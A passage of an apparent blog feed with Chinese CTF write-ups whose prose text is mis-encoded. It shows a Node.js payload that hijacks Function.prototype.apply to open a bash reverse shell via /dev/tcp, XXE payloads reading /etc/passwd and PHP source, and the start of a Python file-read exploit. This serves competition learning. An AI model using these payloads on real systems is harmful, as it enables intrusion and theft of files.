class="string">'http://www.baidu.com/'</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/09/05/7qYNs8JWiSdBPLA.png" alt="4AE71B08-7379-416E-AF2A-AD6A693D8F71.png"></p><p>ä¹‹åæ”¹å†™paylaodä¾¿å¯ä»¥ç›´æ¥rceäº†<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.apply2=<span class="built_in">Function</span>.prototype.apply;</span><br><span class="line"><span class="built_in">Function</span>.prototype.apply=<span class="function"><span class="keyword">function</span>(<span class="params">...args</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(args[<span class="number">0</span>]!=<span class="literal">null</span> &amp;&amp; args[<span class="number">0</span>]!=<span class="literal">undefined</span> &amp;&amp; args[<span class="number">0</span>].env!=<span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="built_in">Function</span>.prototype.apply=<span class="built_in">Function</span>.prototype.apply2;</span><br><span class="line">        args[<span class="number">0</span>].mainModule.require(<span class="string">'child_process'</span>).exec(<span class="string">'bash -c "bash -i &gt;&amp; /dev/tcp/XXXXXX/8080 0&gt;&amp;1"'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.apply2(...args)</span><br><span class="line">&#125;</span><br><span class="line">request.get(<span class="string">'http://www.baidu.com/'</span>,<span class="literal">null</span>)</span><br></pre></td></tr></table></figure></p><p>å¯ä»¥çœ‹åˆ°æˆåŠŸåå¼¹äº†shell<br><img src="https://i.loli.net/2019/09/05/ajvDxVtKH7Q4m5r.png" alt="403CCAC2-DE75-4FE2-810E-B8DB1D2BBE5F.png"><br>ä½†æ˜¯è¿™æ ·åå¼¹çš„æ˜¯ä½ æœ¬åœ°çš„shellï¼Œä¹‹åæƒ³å¾—åˆ°flagè¿˜å¾—ç»“åˆä¹‹å‰æåˆ°çš„xss</p><p>ä¸Šé¢è¿™ç§æš´åŠ›fuzzçš„æ–¹å¼ï¼Œç›´æ¥getåˆ°äº†requeståº“ä¸­æ˜¯æœ‰processçš„ç›¸å…³è°ƒç”¨çš„ï¼Œè¿›è€Œè¾¾åˆ°äº†rceçš„æ•ˆæœï¼Œé‚£ä¹ˆä»ç™½ç›’è§’åº¦æ˜¯æ€ä¹ˆè¿›è¡Œåˆ†æçš„å‘¢ï¼Ÿ</p><p>ä»ä½œè€…çš„<a href="https://github.com/imagemlt/iCloudMusic" target="_blank" rel="noopener">github</a>ä¸Šæˆ‘äº†è§£åˆ°ï¼Œrequeståº“/httpåº“/å…¶ä»–å¾ˆå¤šnodeåº“æ˜¯éƒ½æœ‰å¯èƒ½è°ƒç”¨processç›¸å…³å‡½æ•°çš„ï¼Œæ¯”å¦‚process.nextTick</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Æ’ (...args) &#123;</span><br><span class="line">            process.activateUvLoop();</span><br><span class="line">            <span class="keyword">return</span> func.apply(<span class="keyword">this</span>, args);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„<code>func.apply</code>å…¶å®å°±æ˜¯<code>Function.prototype.apply</code>ï¼Œå¹¶ä¸”è¿™é‡Œé¢çš„thiså°±æ˜¯æŒ‡å‘processè‡ªèº«ã€‚æˆ‘ä»¬å¯ä»¥åœ¨requesté‡Œé¢çœ‹åˆ°å¯¹è¿™ä¸ªå‡½æ•°çš„è°ƒç”¨</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defer = <span class="keyword">typeof</span> setImmediate === <span class="string">'undefined'</span></span><br><span class="line">  ? process.nextTick</span><br><span class="line">  : setImmediate</span><br></pre></td></tr></table></figure><p>httpåº“ä¸­ç”¨ä¸å¤„ç†socketè¯·æ±‚çš„ä¸€ä¸ªå…³é”®å‡½æ•°ä¹Ÿè°ƒç”¨äº†è¿™ä¸ªå‡½æ•°</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClientRequest.prototype.onSocket = <span class="function"><span class="keyword">function</span> <span class="title">onSocket</span>(<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  process.nextTick(onSocketNT, <span class="keyword">this</span>, socket);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ä»ç™½ç›’çš„è§’åº¦æ¥çœ‹å¯ä»¥æ›´å¥½çš„çŸ¥é“ä¸ºä»€ä¹ˆä¸Šé¢çš„payloadå¯ä»¥è¾¾åˆ°rce</p><h2 id="0x08-Game"><a href="#0x08-Game" class="headerlink" title="0x08 Game"></a>0x08 Game</h2><h4 id="é¢˜ç›®æè¿°-7"><a href="#é¢˜ç›®æè¿°-7" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>How fast can you play?</p><p><a href="http://47.111.59.243:1081" target="_blank" rel="noopener">http://47.111.59.243:1081</a></p><h4 id="é¢˜ç›®è§£ç­”-7"><a href="#é¢˜ç›®è§£ç­”-7" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>ç›´æ¥æŸ¥çœ‹æºä»£ç å¾—åˆ°flagï¼ˆå‡çš„ï¼Œemmmm</p><p>view-source:<a href="http://47.111.59.243:1081/" target="_blank" rel="noopener">http://47.111.59.243:1081/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  &lt;div class=&quot;text text--best-time&quot;&gt;</span><br><span class="line">    &lt;icon trophy&gt;&lt;/icon&gt;</span><br><span class="line">    &lt;span&gt;Well done!ï¼Œ</span><br><span class="line"> here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2===  &lt;/span&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>base32åå¾—åˆ°flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">suctf&#123;hAHaha_Fak3_F1ag&#125;</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æ˜¯ä¸ªæ¸¸æˆå°±æœ‰å¯èƒ½æ˜¯æ”¹çš„å¼€æºä»£ç ï¼Œæ‰€ä»¥æŠ±è¿™è¿™ç§æƒ³æ³•å°±å»æ‰¾äº†æºç ï¼Œå°±æ‰¾åˆ°äº†</p><p><a href="http://www.jq22.com/jquery-info21216" target="_blank" rel="noopener">http://www.jq22.com/jquery-info21216</a></p><p>ç„¶åä»é‡Œé¢diffå‡ºä¸åŒç‚¹<br><img src="https://i.loli.net/2019/09/05/xnwBoXb1lgv93q7.png" alt="71F7F13A-9AB1-4D56-BCE1-38E2BD91E070.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var acd = mysecretishere.iZwz9i9xnerwj6o7h40eauZ.png;</span><br></pre></td></tr></table></figure><p>ä¹‹åä¸‹è½½å›¾ç‰‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://47.111.59.243:1081/iZwz9i9xnerwj6o7h40eauZ.png</span><br></pre></td></tr></table></figure></p><p>åˆ†æä¹‹åå‘ç°æ˜¯lsbéšå†™<br><img src="https://i.loli.net/2019/09/05/Lw9j2aX8mvonHFu.png" alt="0E0DEF7B-AD12-434C-A7F2-6640F150B0C7.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To/KeuHg8vKAxFrVQ==</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨3desè§£å¯†å³å¯å¾—åˆ°flag<br><img src="https://i.loli.net/2019/09/05/CeHyOgw8f9QdzZq.png" alt="30A0E76B-7523-477C-88FB-E400F79C097A.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h2&gt;&lt;p&gt;åˆæ˜¯å¾ˆå—¨çš„ä¸€åœºæ¯”èµ›ã€‚&lt;/p&gt;
&lt;p&gt;PS: è¡¥å……äº†iCloudMusicçš„ä¸ªäººè¯¦ç»†é¢˜è§£&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>ç½‘ç»œä¸ä¿¡æ¯å®‰å…¨é¢†åŸŸä¸“é¡¹èµ›WP</title>
    <link href="http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/"/>
    <id>http://zer0yu.github.io/2019/08/16/2019-8-15-writeup/</id>
    <published>2019-08-16T02:49:37.000Z</published>
    <updated>2019-08-16T03:05:44.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h2><p>æƒ¨æƒ¨æƒ¨ï¼Œé€Ÿæˆäº†ä¸€ä¸‹miscï¼Œæœ€åè¿˜æ˜¯21ï¼Œé‚£ä¸ªwebæ³¨å…¥ä¹Ÿæ²¡è§£å‡ºæ¥</p><h2 id="0x01-Game"><a href="#0x01-Game" class="headerlink" title="0x01 Game"></a>0x01 Game</h2><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>Enjoy the Game.</p><h4 id="é¢˜ç›®è§£ç­”"><a href="#é¢˜ç›®è§£ç­”" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>æ‰“å¼€ç½‘é¡µå‘ç°ç©å„¿èµ·æ¥æ²¡ä»€ä¹ˆå¼‚å¸¸ï¼Œæ‰‹æ®‹ç‚¹ä¸ä¸Šä¸‰ä¸ªä¹Ÿæ²¡æœ‰è§¦å‘ä»»ä½•ç½‘ç»œè¯·æ±‚ï¼Œæ‰€ä»¥ä½¿ç”¨devtoolæ¥åˆ†æjs</p><p><img src="https://i.loli.net/2019/08/16/VIOxbpveEhHfy2G.png" alt="9A105552-D2DA-4842-82BB-41532FACFF75.png"></p><p>åœ¨cqg.jsä¸­çœ‹åˆ°å¦‚ä¸‹ä»£ç <br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score == <span class="number">15</span>)&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url: <span class="string">'score.php'</span>,</span><br><span class="line">        type: <span class="string">'POST'</span>,</span><br><span class="line">        data: <span class="string">'score='</span>+score,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> data = data;</span><br><span class="line">            $(<span class="string">"#output"</span>).text(data);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>æ‰€ä»¥æ‰‹åŠ¨å‘ä¸€ä¸‹è¯·æ±‚å¾—åˆ°flag</p><p><img src="https://i.loli.net/2019/08/16/eRgxWLZnFyid18U.png" alt="C676ECDC-CE3F-4762-A1AB-D4A616A38117.png"></p><h2 id="0x02-who-are-you"><a href="#0x02-who-are-you" class="headerlink" title="0x02 who_are_you?"></a>0x02 who_are_you?</h2><h4 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>who are you?</p><h4 id="é¢˜ç›®è§£ç­”-1"><a href="#é¢˜ç›®è§£ç­”-1" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>ç¼–è¾‘ç”¨æˆ·åæäº¤ï¼Œå‘ç°æäº¤çš„æ˜¯xmlæ•°æ®ï¼Œè‡ªç„¶æƒ³åˆ°xxeæ”»å‡»</p><p>å› ä¸ºæ­¤å¤„æ˜¯ç‚¹å‡»ä¹‹åæäº¤æ‰€ä»¥ä¹Ÿå°±è‡ªç„¶è”æƒ³åˆ°æ˜¯jså‘çš„è¯·æ±‚ï¼ŒæŸ¥çœ‹æºç å°±èƒ½çœ‹åˆ°å¯¹åº”çš„jsä»£ç ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + <span class="built_in">document</span>.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        <span class="built_in">console</span>.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                <span class="built_in">document</span>.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>æ„é€ å¸¸è§„çš„payloadè¯»<code>/etc/passwd</code>æˆåŠŸ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/08/16/OiAnJa7lFsCxGUR.png" alt="E1C38A08-C528-465F-9615-26446113B484.png"></p><p>ä½†æ˜¯è¿™ç§payloadä¸èƒ½è¯»å–åˆ°å¯¹åº”çš„index.phpæºç æ–‡ä»¶ï¼Œä¸€æ˜¯ç»å¯¹è·¯å¾„æˆ‘ä¸çŸ¥é“ï¼ˆä½†æ˜¯å¯ä»¥bruteï¼‰ï¼ŒäºŒæ˜¯è¿™æ ·è¯»å–åœ¨å¤„ç†<code>&lt;</code>ç¬¦å·æ—¶ä¼šå‡ºç°é—®é¢˜ï¼Œæ‰€ä»¥è¦ä½¿ç”¨ä¼ªåè®®æ¥è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€ç»ˆè¯»å–åˆ°å¯¹åº”çš„æºä»£ç å¦‚ä¸‹ï¼Œflagå°±åœ¨æºä»£ç é‡Œé¢</p><p><img src="https://i.loli.net/2019/08/16/MZU7HyIdQARik1X.png" alt="706FDA0A-96CC-4443-98AB-72EA2DBB999E.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$resp = <span class="string">''</span>;</span><br><span class="line"><span class="comment">//$flag='flag&#123;b634b4b5-7780-4641-86a7-0e4b43093b26&#125;';</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="keyword">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"./style.css"</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">"X-UA-Compatible"</span> content=<span class="string">"ie=edge"</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class="contactBody"&gt;</span><br><span class="line">&lt;div class="wrapper"&gt;</span><br><span class="line">    &lt;div class="title"&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method="post" class="form"&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">"title"</span>&gt;Ã¨Â¯Â·Ã¨Â¾Â“Ã¥Â…Â¥Ã¥Â§Â“Ã¥ÂÂ&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type="text" class="name entry " id="name" name="name" placeholder="Your Name"/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class="submit entry" onclick="func()"&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="shadow"&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">''</span> +</span><br><span class="line">            <span class="string">'&lt;\?xml version="1.0" encoding="UTF-8"\?&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;feedback&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;author&gt;'</span> + document.getElementById(<span class="string">'name'</span>).value+ <span class="string">'&lt;/author&gt;'</span> +</span><br><span class="line">            <span class="string">'&lt;/feedback&gt;'</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">'title'</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">"POST"</span>, <span class="string">"index.php"</span>, <span class="keyword">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="0x03-show-me-your-image"><a href="#0x03-show-me-your-image" class="headerlink" title="0x03 show_me_your_image"></a>0x03 show_me_your_image</h2><h4 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>Itâ€™s no easy.</p><h4 id="é¢˜ç›®è§£ç­”-2"><a href="#é¢˜ç›®è§£ç­”-2" class="headerlink" title="é¢˜ç›®è§£ç­”"></a>é¢˜ç›®è§£ç­”</h4><p>å…ˆä¸Šä¼ ä¸€å¼ æ­£å¸¸å›¾ç‰‡ï¼Œå‘ç°å¯ä»¥æ­£å¸¸æ˜¾ç¤º</p><p><img src="https://i.loli.net/2019/08/16/XG2EMCNBg1VcPxI.png" alt="A9B778D3-C0A1-4756-A7E7-751E730CCB37.png"></p><p>å¹¶ä¸”å›¾ç‰‡çš„é“¾æ¥å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fc663c386ea14c96ba9808b72602d341fda4447a2bfb4e01.changame.ichunqiu.com/img.php?name=lk7Bl4hRjmj%3D</span><br></pre></td></tr></table></figure></p><p>ä¸»è¦è§‚å¯Ÿimg.phpåé¢è·Ÿçš„è¯·æ±‚å‚æ•°ï¼Œå¥½åƒæ˜¯baseç¼–ç çš„ä¸€æ ·ï¼Œä½†æ˜¯å°è¯•base64è§£ç ä¹‹åå‘ç°æ˜¯ä¹±ç ã€‚</p><p><img src="https://i.loli.net/2019/08/16/Gh4w9iobVFqJytm.png" alt="80BE64FB-F874-4D8C-8BF6-ED466F5B5C14.png"></p><p>ä½†æ˜¯å¹¶ä¸å½±å“æˆ‘ä»¬çŒœæµ‹è¿™æ˜¯ä¸€ä¸ªé€šè¿‡æŸç§æ–¹å¼ç¼–ç çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œä¹‹ååˆ™æ˜¯è¦è¿›è¡Œå·²çŸ¥æ˜æ–‡çŒœè§£ï¼Œé€šè¿‡fuzzçš„æ–¹å¼è¿›è¡Œã€‚å‘ç°å¯èƒ½æ˜¯3-&gt;4çš„å˜ç§baseç¼–ç ï¼Œå› æ­¤åªè¦åˆ©ç”¨ä»–è‡ªèº«çš„åŠ å¯†åŠŸèƒ½åŒºåŠ å¯†ï¼Œç„¶åå¾—åˆ°æˆ‘ä»¬æƒ³è¦çš„åŠ å¯†å­—ç¬¦ä¸²å°±å¥½äº†ã€‚</p><p>æ ¹æ®åŸç†å†™å‡ºExpå¦‚ä¸‹<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base_encode</span><span class="params">(target, filename)</span>:</span></span><br><span 